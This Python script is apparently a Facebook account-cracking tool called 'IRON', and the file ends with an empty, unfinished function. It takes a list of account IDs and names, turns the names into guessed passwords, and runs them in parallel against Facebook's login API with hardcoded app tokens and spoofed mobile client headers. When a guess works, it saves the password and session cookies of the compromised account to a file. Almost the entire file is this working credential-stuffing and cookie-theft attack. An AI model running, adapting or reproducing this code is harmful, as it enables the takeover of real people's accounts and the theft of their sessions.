""" Released by Exotic Hridoy """

import string
green = "\033[1;92m"
red = "\033[1;91m"
logo = f""" \033[1;91m┏{green}              \033[1;91m┓
 \033[1;91m┃{green}  ███    ███  \033[1;91m┃  {green}AUTHOR  \033[1;91m: {green}MARUFUL HAQUE MUHIB
 \033[1;91m┃{green}  ████  ████  \033[1;91m┃  {green}GITHUB  \033[1;91m:{green} MUHIB-143
 \033[1;91m┃{green}  ██ ████ ██  \033[1;91m┃  {green}TOOL    \033[1;91m:{green} IRON
 \033[1;91m┃{green}  ██  ██  ██  \033[1;91m┃  {green}YOU GOT \033[1;91m:{green} FILE \033[1;91m |{green} RANDOM
 \033[1;91m┃{green}  ██      ██  \033[1;91m┃  {green}ARCH    \033[1;91m:{green} {__import__('platform').machine()}\033[1;91m |{green} {__import__('platform').architecture()[0]}
 \033[1;91m┗{green}              \033[1;91m┛"""

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

O = '\x1b[0m'
green = '\033[1;92m'
red = '\x1b[1;31m'
g = '\033[1;31m'
o = '\x1b[0m'

import os
import sys
import re
import platform
import zlib
import time
import random
import uuid
import datetime
import base64
import json
import urllib
import requests
from pathlib import Path
from string import *
from concurrent.futures import ThreadPoolExecutor as tred

rc = random.choice
___vers___ = "ON"

A1 = "\x1b[38;5;46m"
A2 = "\x1b[38;5;47m"
A3 = "\x1b[38;5;48m"
A4 = "\x1b[38;5;49m"
A5 = "\x1b[38;5;50m"
A6 = "\x1b[38;5;51m"
O = "\033[0m"
P1 = "\x1b[38;5;197m"
P2 = "\x1b[38;5;197m"
P3 = "\x1b[38;5;198m"
P4 = "\x1b[38;5;199m"
P5 = "\x1b[38;5;200m"
M1 = "\x1b[38;5;208m"
M2 = "\x1b[38;5;209m"
M3 = "\x1b[38;5;210m"
M4 = "\x1b[38;5;211m"
M5 = "\x1b[38;5;212m"

def line():
    print(f"{red}~━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━~")

def clear():
    os.system('clear')
    print(logo)

cki = []
____time____ = datetime.datetime.now()
____year____ = ____time____.year
____month____ = ____time____.month
____day____ = ____time____.day
____token____ = str(____year____) + str(____month____) + str(____day____)

def ____see____(z):
    print(z)

def ____line____():
    print(f"{red}~━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━~")

def ____cls____():
    os.system('clear')
    print(logo)
    ____line____()

oks = []
cps = []
loop = 0
mthd = []
p = print

animation = ["\033[1;92m●\033[0m○○○○○","\033[1;92m●●\033[0m○○○○","\033[1;92m●●●\033[0m○○○","\033[1;92m●●●●\033[0m○○","\033[1;92m●●●●●\033[0m○","\033[1;92m●●●●●●"]

def ____main____():
    os.system('clear')

    print(f""" \033[1;91m┏{green}              \033[1;91m┓
 \033[1;91m┃{green}  ███    ███  \033[1;91m┃  {green}AUTHOR  \033[1;91m: {green}MARUFUL HAQUE MUHIB
 \033[1;91m┃{green}  ████  ████  \033[1;91m┃  {green}GITHUB  \033[1;91m:{green} MUHIB-143
 \033[1;91m┃{green}  ██ ████ ██  \033[1;91m┃  {green}TOOL    \033[1;91m:{green} IRON\033[1;91m |{green} {___vers___}
 \033[1;91m┃{green}  ██  ██  ██  \033[1;91m┃  {green}YOU GOT \033[1;91m:{green} FILE \033[1;91m |{green} RANDOM
 \033[1;91m┃{green}  ██      ██  \033[1;91m┃  {green}ARCH    \033[1;91m:{green} {__import__('platform').machine()}\033[1;91m |{green} {__import__('platform').architecture()[0]}
 \033[1;91m┗{green}              \033[1;91m┛""")

    ____line____()
    ____see____(f"{red}[{green}A{red}]{green} RANDOM CRACKING {red}~  {red}[{green}B{red}]{green} FILE CRACKING {red}~")
    ____see____(f"{red}[{green}C{red}]{green} REPORT TO ADMIN {red}~  {red}[{green}D{red}]{green} JOIN MESSENGER {red}~")
    ____line____()

    ____choose____ = input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")

    if ____choose____ in ["A", "a", "1", "One"]:
        ____RANDOM____()

    elif ____choose____ in ["B", "b", "2", "Two"]:
        time.sleep(1)
        ajkiopolnopkuysneuejusfwnixteboxwh()

    elif ____choose____ in ["C", "c", "3", "Three"]:
        time.sleep(1)
        os.system("xdg-open https://www.facebook.com/its.muhib.7")

    elif ____choose____ in ["D", "d", "4", "Four"]:
        time.sleep(1)
        os.system("xdg-open https://m.me/j/AbadRI0dxL4B7VqT/")

    else:
        time.sleep(1)
        ____see____(f"{red}[{green}!{red}]{green} ERROR OPTION {red}~")
        time.sleep(2)
        return

plist=[];mthd=[]

def ajkiopolnopkuysneuejusfwnixteboxwh():
    ____line____();____see____(f"{red}[{green}!{red}]{green} EXAMPLE {red}~ {green}/sdcard/____file____.txt {red}~");____line____();____file____ = input(f"{red}[{green}!{red}]{green} INPUT FILE {red}~{green} ")
    try:
        ______file______ = open(____file____,'r').read().splitlines()
    except FileNotFoundError:
        time.sleep(1);____see____(f"{red}[{green}!{red}]{green} ERROR OPTION {red}~");time.sleep(2);return ____main____()
    plist=[];____line____()
    try:___pas___ = int(input(f"{red}[{green}!{red}]{green} HOW MANY PASSWORD DO YOU WANT {red}~ {green}"))
    except:___pas___ =1
    ____line____();____see____(f'{red}[{green}!{red}]{green} First Last {red}~ {green}57273200 {red}~{green} Last123 {red}~{green} ১২৩৪৫৬ {red}~')
    ____line____()
    for i in range(___pas___):
        plist.append(input(f"{red}[{green}{i+1}{red}]{green} PASSWORD {red}~ {green}"))
    ____line____();____see____(f"{red}[{green}!{red}]{green} METHOD {red}~{green} A {red}~{green} B{red} ~{green} C {red}~{green} D {red}~");____line____();___method___=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")
    if ___method___ in ["A","a","1","One"]:mthd.append("A")
    elif ___method___ in ["B","b","2","Two"]:mthd.append("B")
    elif ___method___ in ["C","c","3","Three"]:mthd.append("C")
    else:mthd.append("D")
    ____line____();____see____(f"{red}[{green}!{red}]{green} SHOW COOKIE {red}~{green} Y {red}~{green} N{red} ~");____line____();cko=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ");____line____()
    if cko in ['N','n','No','na','Na','2']:cki.append('N')
    else:cki.append('Y')

    def ____cls____():os.system('clear');print(f""" \033[1;91m┏{green}              \033[1;91m┓\n \033[1;91m┃{green}  ███    ███  \033[1;91m┃  {green}AUTHOR  \033[1;91m: {green}MARUFUL HAQUE MUHIB \n \033[1;91m┃{green}  ████  ████  \033[1;91m┃  {green}GITHUB  \033[1;91m:{green} MUHIB-143\n \033[1;91m┃{green}  ██ ████ ██  \033[1;91m┃  {green}TOOL    \033[1;91m:{green} IRON\033[1;91m |{green} {___vers___}\n \033[1;91m┃{green}  ██  ██  ██  \033[1;91m┃  {green}YOU GOT \033[1;91m:{green} FILE \033[1;91m |{green} RANDOM\n \033[1;91m┃{green}  ██      ██  \033[1;91m┃  {green}ARCH    \033[1;91m:{green} {__import__('platform').machine()}\033[1;91m |{green} {__import__('platform').architecture()[0]}\n \033[1;91m┗{green}              \033[1;91m┛""");____line____()
    with tred(max_workers=30) as FILE:
        ____cls____()
        tl = str(len(______file______))
        print(f'{red}[{green}!{red}]{green} ACCOUNTS {red}~{green} {tl} {red}~{green} METHOD {red}~{green} {rc(mthd)} {red}~{green} PASSWORD {red}~{green} {int(___pas___)} {red}~')
        print(f"{red}[{green}!{red}]{green} IF NO RESULT TURN {red}~\033[1;93mOn{red}~\033[1;93mOff{red}~{green} AIRPLANE MODE {red}~")
        ____line____()
        for user in ______file______:
            ids,names = user.split('|')
            passlist = plist
            if 'A' in mthd:
                FILE.submit(____FileM1____,ids,names,passlist)
            elif 'B' in mthd:
                FILE.submit(____FileM2____,ids,names,passlist)
            elif 'C' in mthd:
                FILE.submit(____FileM3____,ids,names,passlist)
            else:
                FILE.submit(____FileM4____,ids,names,passlist)
    print('\n');____line____();print(f"{red}[{green}!{red}]{green} CRACKING WAS COMPLETED {red}~")
    print(f'{red}[{green}!{red}]{green} TOTAL OK ID {red}~{green} '+str(len(oks)));____line____();input();time.sleep(5);exit()
session = __import__("requests").Session()

def ____FileM1Ua____():
    ____uxio____ = f'[FBAN/FB4A;FBAV/{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))};FBBV/{str(random.randint(1111111,9999999))};FBDM/{{density=3.0,width=1440,height=2766}};FBLC/en_US;FBRV/0;FBCR/;FBID/phone;FBFS/;FBPN/com.facebook.katana]'
    return ____uxio____

def ____FileM2Ua____():
    ____uxio____ = f'[FBAN/FB4A;FBAV/{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))};FBBV/{str(random.randint(1111111,9999999))};FBDM/{{density=2.75,width=1080,height=2210}};FBLC/en_US;FBRV/0;FBCR/;FBID/phone;FBFS/;FBPN/com.facebook.katana]'
    return ____uxio____

def ____FileM3Ua____():
    ____uxio____ = f'[FBAN/FB4A;FBAV/{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))};FBBV/{str(random.randint(1111111,9999999))};FBDM/{{density=2.5,width=720,height=1600}};FBLC/en_US;FBRV/0;FBCR/;FBID/phone;FBFS/;FBPN/com.facebook.katana]'
    return ____uxio____

def ____FileM4Ua____():
    ____uxio____ = f'[FBAN/FB4A;FBAV/{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))};FBBV/{str(random.randint(1111111,9999999))};FBDM/{{density=3.5,width=1440,height=3040}};FBLC/en_US;FBRV/0;FBCR/;FBID/phone;FBFS/;FBPN/com.facebook.katana]'
    return ____uxio____

def ____FileM1____(ids,names,passlist):
    try:
        global ok,loop,sim_id
        for i in range(6):
            time.sleep(0.1)
            sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}%s{red}] ~ [{green}M1{red}] ~ [{green}%s{red}] '%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            session = __import__("requests").Session()
            headers = {'User-Agent': ____FileM1Ua____(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
            po = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r\r{red}[{green}ACTIVE{red}]{green} '+uid+f' {red}~ {green}'+pas)
                    if 'Y' in cki:
                        print(f"{red}[{green}COOKIE{red}]{green} {cookie}\n")
                    open('/sdcard/MUHIB/MUHIB-FILE-M1.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

def ____FileM2____(ids,names,passlist):
    try:
        global ok,loop,sim_id
        for i in range(6):
            time.sleep(0.1)
            sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}%s{red}] ~ [{green}M2{red}] ~ [{green}%s{red}] '%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            session = __import__("requests").Session()
            data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {'User-Agent': ____FileM2Ua____(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            po = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print('\r\r\033[1;97m[\033[1;92mACTIVE\033[1;97m]\033[1;32m '+ids+' | '+pas)
                if 'Y' in cki:
                        print(f"{O}[{green}COOKIE{O}]{green} {coki}\n")
                open('/sdcard/MUHIB/MUHIB-FILE-M2.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                 open('/sdcard/MUHIB-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
            else:
                 continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

def ____FileM3____(ids,names,passlist):
    try:
        global ok,loop,sim_id
        for i in range(6):
            time.sleep(0.1)
            sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}%s{red}] ~ [{green}M3{red}] ~ [{green}%s{red}] '%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            session = __import__("requests").Session()
            data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {'User-Agent': ____FileM3Ua____(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            po = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\033[1;97m[\033[1;92mACTIVE\033[1;97m]\033[1;32m '+uid+' | '+pas)
                    if 'Y' in cki:
                        print(f"{O}[{green}COOKIE{O}]{green} {cookie}\n")
                    open('/sdcard/MUHIB/MUHIB-FILE-M3.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

def ____FileM4____(ids,names,passlist):
    try:
        global ok,loop,sim_id
        for i in range(6):
            time.sleep(0.1)
            sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}%s{red}] ~ [{green}M4{red}] ~ [{green}%s{red}] '%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            session = __import__("requests").Session()
            data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pas,"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            headers = {"User-Agent":____FileM4Ua____(),"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            po = session.post('https://api.facebook.com/auth/login',data=data,headers=headers,allow_redirects=False).json()
            if 'session_key' in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print('\r\r\033[1;97m[\033[1;92mACTIVE\033[1;97m]\033[1;32m '+ids+' | '+pas)
                if 'Y' in cki:
                    print(f"{O}[{green}COOKIE{O}]{green} {coki}\n")
                open('/sdcard/MUHIB/MUHIB-FILE-M4.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                 open('/sdcard/MUHIB-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
            else:
                 continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

def ____RANDOM____():
